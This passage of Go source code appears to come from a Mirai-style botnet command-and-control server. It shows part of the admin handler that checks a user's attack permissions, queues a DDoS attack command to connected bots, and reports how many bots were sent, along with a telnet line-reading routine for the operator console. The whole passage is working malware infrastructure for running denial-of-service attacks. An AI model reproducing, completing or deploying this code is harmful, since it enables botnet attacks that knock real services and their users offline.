                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var YotCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        YotCount = userInfo.maxBots
                    } else {
                        YotCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("\033[4;34m[+] \033[4;31m Attack\033[4;35m sent\033[4;33m with \033[4;37m%d \033[4;32mbots\r\n", YotCount)))
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\033' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
